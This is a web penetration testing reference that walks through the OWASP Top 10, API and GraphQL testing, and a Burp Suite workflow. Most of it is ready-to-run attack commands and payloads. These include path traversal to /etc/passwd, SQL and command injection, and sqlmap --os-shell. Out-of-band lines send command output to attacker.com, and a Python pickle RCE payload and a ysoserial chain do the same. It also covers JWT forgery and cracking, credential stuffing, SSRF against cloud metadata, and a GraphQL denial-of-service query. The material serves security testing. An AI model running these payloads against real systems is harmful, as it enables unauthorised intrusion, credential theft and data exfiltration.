# Web Application Penetration Testing

## Overview

Web application testing follows OWASP methodology to identify vulnerabilities in web applications, APIs, and their supporting infrastructure. This reference covers the OWASP Top 10 testing techniques and tools.

## OWASP Top 10 Testing

### A01 — Broken Access Control

**Testing Techniques:**
```bash
# Horizontal privilege escalation
# Test: Can user A access user B's data?
curl -H "Cookie: session=user_a_session" https://api.example.com/users/1234/orders
curl -H "Cookie: session=user_a_session" https://api.example.com/users/5678/orders  # Should fail

# Vertical privilege escalation
# Test: Can regular user access admin endpoints?
curl -H "Cookie: session=regular_user" https://admin.example.com/users
curl -H "Cookie: session=regular_user" https://api.example.com/v1/admin/users

# IDOR (Insecure Direct Object Reference)
# Test: Increment/decrement IDs in requests
for id in $(seq 1 100); do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://api.example.com/documents/$id")
    echo "Document $id: $response"
done

# Path traversal
ffuf -u "https://example.com/download?file=FUZZ" -w traversal_payloads.txt -fc 403,404

# Mass assignment
# Test: Add unexpected fields to JSON/XML requests
curl -X PUT -H "Content-Type: application/json" \
     -d '{"username":"test","role":"admin","is_admin":true}' \
     https://api.example.com/users/profile
```

**Payload Examples:**
```
# Path traversal payloads
../../../etc/passwd
..%252f..%252f..%252fetc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# IDOR payloads
/api/users/00000000-0000-0000-0000-000000000001
/api/orders?page=1&limit=100&sort=-createdAt
```

### A02 — Cryptographic Failures

**Testing Techniques:**
```bash
# Weak TLS ciphers
nmap --script ssl-enum-ciphers -p 443 example.com
testssl.sh --enumerate example.com:443

# Sensitive data in transit
# Check if HTTPS redirects properly
curl -sI http://example.com | grep -i location

# Weak password hashing
# Check if passwords are sent in cleartext
# Check response for password format info

# Hardcoded secrets
grep -r "password\|secret\|api_key\|token" --include="*.js" .
grep -r "AKIA[0-9A-Z]\{16\}" .  # AWS keys
grep -r "ghp_[A-Za-z0-9]\{36\}" .  # GitHub tokens
```

### A03 — Injection

**SQL Injection:**
```bash
# Automated detection
sqlmap -u "https://example.com/page?id=1" --batch --level=5 --risk=3
sqlmap -r request.txt --batch --dbms=mysql --os-shell

# Manual testing
# Time-based
curl "https://example.com/page?id=1' AND SLEEP(5)--"
curl "https://example.com/page?id=1' WAITFOR DELAY '0:0:5'--"

# Error-based
curl "https://example.com/page?id=1' UNION SELECT 1,2,3,@@version--"

# Boolean-based
curl "https://example.com/page?id=1' AND 1=1--"  # Should return normal
curl "https://example.com/page?id=1' AND 1=2--"  # Should differ

# Out-of-band (DNS)
curl "https://example.com/page?id=1' exec master..xp_dirtree '//attacker-control.oastify.com/foo'--"
```

**NoSQL Injection:**
```javascript
// MongoDB injection payloads
// Original: {"username": "admin", "password": "password"}
// Injection: {"username": "admin", "password": {"$ne": ""}}
// Injection: {"$where": "this.password.length > 0"}
// Injection: {"username": {"$regex": ".*"}}
```

**Command Injection:**
```bash
# Blind command injection
curl "https://example.com/ping?host=8.8.8.8;id"
curl "https://example.com/ping?host=8.8.8.8|id"
curl "https://example.com/ping?host=8.8.8.8`id`"
curl "https://example.com/ping?host=8.8.8.8$(id)"

# Time-based
curl "https://example.com/ping?host=8.8.8.8;sleep+5"
curl "https://example.com/ping?host=8.8.8.8|ping+-c+5+127.0.0.1"

# Out-of-band
curl "https://example.com/ping?host=8.8.8.8;curl+http://attacker.com/$(id)"
```

### A04 — Insecure Design

**Testing Areas:**
- Rate limiting bypass (X-Forwarded-For rotation, distributed testing)
- Business logic flaws (negative quantities, race conditions)
- Missing authentication on critical flows (password reset, email change)
- Unlimited file uploads (size, type, quantity)
- Sequential predictable tokens/IDs

**Race Condition Testing:**
```bash
# Race condition on coupon/promotion
for i in {1..50}; do
    curl -s -X POST "https://example.com/coupon/redeem?code=FREE100" &
done
wait
```

### A05 — Security Misconfiguration

```bash
# Default credentials
hydra -l admin -P common_passwords.txt https-post-form://example.com/login:username=^USER^&password=^PASS^:F=Invalid

# Directory listing
curl -s https://example.com/assets/
curl -s https://example.com/backup/

# Debug/Info endpoints
curl -s https://example.com/.env
curl -s https://example.com/actuator/health
curl -s https://example.com/debug
curl -s https://example.com/phpinfo.php
curl -s https://example.com/server-status

# HTTP methods
curl -X OPTIONS https://api.example.com/ -v
curl -X PUT https://api.example.com/users -d '{"role":"admin"}'
curl -X DELETE https://api.example.com/users/1

# Verb tampering
curl -X GET https://example.com/delete -H "X-HTTP-Method-Override: DELETE"
```

### A06 — Vulnerable Components

```bash
# Identify component versions
# Check response headers for version info
curl -sI https://example.com | grep -i "server\|x-powered-by\|x-aspnet-version"

# JavaScript library scanning
npx retire --outputformat json --outputpath retire_results.json
nuclei -u https://example.com -t technologies/

# Dependency checking
# OWASP Dependency-Check
dependency-check --scan project.war --format HTML --out /reports

# Snyk
snyk test --all-projects
snyk monitor
```

### A07 — Identification and Authentication Failures

```bash
# Credential stuffing
ffuf -w users.txt:W1 -w passwords.txt:W2 -u https://example.com/login \
  -X POST -d "username=W1&password=W2" -fc 401

# Session management
# Test session fixation
curl -c cookies.txt -b "session=fixed-session-id" https://example.com/login -d "user=test&pass=test"
# After login, check if session ID changed

# JWT attacks
# Check algorithm confusion
jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIn0.abc123 -T

# Weak password policy
curl -X POST -d '{"username":"test","password":"123"}' https://example.com/register
```

**JWT Attack Examples:**
```python
# JWT algorithm confusion
import jwt

# Weak secret cracking
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abc123"
with open("rockyou.txt") as f:
    for line in f:
        try:
            decoded = jwt.decode(token, line.strip(), algorithms=["HS256"])
            print(f"Key found: {line.strip()}")
            break
        except:
            pass

# alg:none attack
none_token = jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")

# RS256 → HS256 confusion (if public key is known)
public_key = open("public.pem").read()
forged = jwt.encode({"sub": "admin", "role": "admin"}, public_key, algorithm="HS256")
```

### A08 — Software and Data Integrity Failures

```bash
# CI/CD pipeline attacks
curl -s https://example.com/Jenkins/
curl -s https://example.com/artifactory/
curl -s https://example.com/.circleci/config.yml

# Deserialization attacks
# Java
ysoserial CommonsCollections1 'curl http://attacker.com/$(whoami)' | base64

# PHP
# O:8:"stdClass":0:{}
# a:1:{s:4:"test";s:8:"injected";}

# Python pickle
python3 -c "
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(whoami)',))
print(pickle.dumps(RCE()).hex())
"

# Insecure dependency in supply chain
# Check for typo-squatting packages
# Check for malicious npm/pip/packages
```

### A09 — Security Logging and Monitoring Failures

```bash
# Test logging mechanisms
# Failed login attempts
curl -X POST -d "username=test&password=wrong" https://example.com/login
# Are failed attempts logged?

# Suspicious activity detection
curl -X POST -d "username=admin' OR '1'='1" https://example.com/login
# Does this trigger any alert?

# Audit log completeness
# Check for sensitive data in URLs
curl -s https://example.com/error?msg=token%20is%20abc123%20expired
```

### A10 — Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF
curl "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://example.com/fetch?url=http://localhost:8080/admin"
curl "https://example.com/fetch?url=file:///etc/passwd"

# Blind SSRF
# Use collaborator/out-of-band
curl "https://example.com/fetch?url=http://your.burpcollaborator.net/test"

# Protocol smuggling
curl "https://example.com/fetch?url=http://127.0.0.1:6379/"  # Redis
curl "https://example.com/fetch?url=http://127.0.0.1:9200/"  # Elasticsearch
curl "https://example.com/fetch?url=dict://127.0.0.1:6379/info"  # Dict protocol

# DNS rebinding
# Use a DNS rebinding service like rebind.it
curl "https://example.com/fetch?url=http://7f000001.6275626e.ip/"

# Cloud metadata endpoints
curl "https://example.com/fetch?url=http://169.254.169.254/"
curl "https://example.com/fetch?url=http://metadata.google.internal/"
curl "https://example.com/fetch?url=http://100.100.100.200/latest/meta-data/"  # Alibaba
```

## API Testing

### REST API Testing
```bash
# Parameter pollution
curl "https://api.example.com/users?id=1&id=2&id=3"

# Mass assignment
curl -X PATCH -H "Content-Type: application/json" \
     -d '{"email":"hacker@evil.com","role":"admin","is_admin":true}' \
     https://api.example.com/users/me

# Rate limiting tests
for i in {1..1000}; do
    curl -s -o /dev/null "https://api.example.com/orders" &
done

# Authentication bypass
curl -H "Authorization: Bearer invalid" https://api.example.com/admin
curl "https://api.example.com/admin"
curl -H "X-API-Key: test" https://api.example.com/admin
```

### GraphQL Testing
```graphql
# Introspection query
query {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
  }
}

# Batch query / Batching attack
query {
  user1: user(id: 1) { email role }
  user2: user(id: 2) { email role }
  user3: user(id: 3) { email role }
}

# Deeply nested query (DoS)
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author { name }
            }
          }
        }
      }
    }
  }
}

# Insecure mutation
mutation {
  updateUser(id: 1, input: {role: "admin"}) { id role }
}
```

## Burp Suite Professional Workflow

```yaml
burp_workflow:
  spider:
    - "Crawl target with Spider/Browser"
    - "Set scope to target application"
    - "Target: https://example.com"

  passive_scan:
    - "Review passive scan alerts"
    - "Check for info disclosure in responses"
    - "Review cookies and headers"

  active_scan:
    - "Right-click → Do Active Scan"
    - "Target: All in-scope items"
    - "Configure: Audit checks → Select all active checks"

  manual_testing:
    - "Repeater: Manual request manipulation"
    - "Intruder: Position-based fuzzing"
    - "Sequencer: Session token analysis"
    - "Decoder: Encode/decode payloads"
    - "Comparer: Response comparison"
    - "Collaborator: Out-of-band detection"
    - "Clickbandit: Clickjacking tests"

  extensions:
    - "Autorize: Authorization testing"
    - "Backslash Powered Scanner: Advanced scanning"
    - "Collaborator Everywhere: OOB detection everywhere"
    - "HTTP Request Smuggler: Smuggling tests"
    - "Turbo Intruder: High-speed brute forcing"
